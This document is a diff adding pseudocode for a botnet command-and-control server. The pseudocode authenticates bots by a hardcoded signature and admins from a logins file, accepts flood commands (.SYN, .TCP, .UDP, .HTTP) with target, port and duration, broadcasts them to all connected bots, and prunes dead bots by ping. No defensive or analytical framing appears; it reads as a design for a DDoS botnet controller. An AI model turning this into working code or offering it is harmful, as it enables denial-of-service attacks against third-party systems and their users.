@@ -1,0 +1,45 @@
+Require: Listen port for C2 server
+Ensure: Accepts connections, authenticates bots and admins, broadcasts attack commands
+
+procedure main()
+1:  Initialize C2 server socket on specified port
+2:  Enable socket keep-alive and reuse-address
+3:  Start background thread ping() to monitor bot connections
+4:  loop forever do
+5:      Accept new incoming connection
+6:      Start new thread handle_client(connection)
+
+procedure handle_client(connection)
+1:  Request 'Username' and 'Password' from connection
+2:  if password matches predefined bot_signature then
+3:      Add connection to active bots list
+4:  else if credentials match admin_login in logins.txt then
+5:      Start thread command_line(connection)
+6:  else
+7:      Close connection
+
+procedure command_line(admin_connection)
+1:  loop forever do
+2:      Receive data from admin_connection
+3:      Parse command (e.g., .SYN, .TCP, .UDP, .HTTP) and arguments
+4:      Validate target IP, port, duration, and packet size constraints
+5:      if validation is successful then
+6:          Call broadcast(command_data)
+7:      else
+8:          Send error message to admin_connection
+
+procedure broadcast(command_data)
+1:  for each bot in active bots list do
+2:      Try to send command_data to bot
+3:      if sending fails then
+4:          Remove bot from active bots list
+5:          Close bot connection
+
+procedure ping()
+1:  loop forever do
+2:      for each bot in active bots list do
+3:          Send 'PING' request to bot
+4:          if response is not 'PONG' or timeout occurs then
+5:              Remove bot from active bots list
+6:              Close bot connection
+7:      Wait for 5 seconds
